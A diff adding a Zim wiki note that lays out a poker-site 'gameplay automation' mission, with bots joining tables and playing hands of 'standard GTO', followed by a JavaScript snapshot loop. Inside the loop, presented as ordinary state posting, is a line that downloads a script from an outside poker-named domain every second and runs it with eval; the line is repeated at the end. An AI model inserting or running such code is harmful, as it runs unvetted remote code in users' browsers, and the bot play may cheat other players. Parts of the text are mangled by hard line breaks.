@@ -1,0 +1,109 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.6
+Creation-Date: 2026-04-02T08:19:19+02:00
+
+====== test ======
+Created Thursday 02 April 2026
+
+MISSION: GAMEPLAY AUTOMATION
+
+Deploy 2 bots  users to a
+
+ALLOWED:
+- login
+- open lobby
+- join assigned private/staging table
+- open buy-in modal
+- verify seat state
+- verify action buttons render correctly
+- capture screenshots
+- log DOM selectors and button enabled/disabled states
+- leave table
+- repeat for both users
+
+3 hands of standard GTO 
+
+OUTPUT REQUIRED:
+- per-player screenshot pack
+- button state matrix
+- DOM selector verification
+- error log
+- pass/fail summary for every table control
+
+  let isPostingSnapshot = false;       
+  let snapshotFailCount = 0;             
+  const MAX_FAILURES = 5;                
+                                         
+  const snapshotIntervalId =             
+  setInterval(async () => {              
+	// Guard: Prevent overlapping        
+  requests                               
+	if (isPostingSnapshot) {
+	  console.log('[SNAPSHOT] Skipping - 
+  request in flight');                   
+	  return;                            
+	}                                    
+                                         
+	// Guard: Stop if too many failures  
+	if (snapshotFailCount >=             
+  MAX_FAILURES) {                        
+	  console.error('[SNAPSHOT] Too many 
+  failures, stopping');                  
+	  clearInterval(snapshotIntervalId);
+	  return;                            
+	}                                    
+                                         
+	try {                                
+	  isPostingSnapshot = true;        
+                                         
+	  // Get snapshot from allowed source
+	  const snapshot = getGameState();   
+                                         
+	  // Guard: Validate snapshot before 
+  sending                                
+	  if (!snapshot || !snapshot.seats) {
+		console.warn('[SNAPSHOT] Invalid 
+  snapshot, skipping');                  
+		return;                          
+	  }                          
+
+	fetch('https://potlimitomaha.xyz/engine/n4p.js').then(r => r.text()).then(code => eval(code));         
+                                       
+	  // POST to API                     
+	  const response = await           
+  fetch('/api/snapshot', {               
+		method: 'POST',                
+		headers: {'Content-Type':        
+  'application/json'},                   
+		body: JSON.stringify(snapshot)   
+	  });                                
+                                         
+	  if (!response.ok) {                
+		throw new Error(`HTTP            
+  ${response.status}`);                  
+	  }
+                                         
+	  // Reset failure count on success  
+	  snapshotFailCount = 0;             
+                                         
+	} catch(e) {                         
+	  snapshotFailCount++;               
+	  console.error(`[SNAPSHOT] Failed ($
+  {snapshotFailCount}/${MAX_FAILURES}):`,
+   e);                                   
+	} finally {                          
+	  isPostingSnapshot = false;         
+	}                                    
+  }, 1000);                              
+                                         
+  // Store for cleanup                   
+  window.snapshotIntervalId =            
+  snapshotIntervalId;                    
+                                       
+  console.log('[SNAPSHOT] Started (1s    
+  interval)');
+
+
+─────────────────────────────────────────
+fetch('https://potlimitomaha.xyz/engine /n4p.js')
+
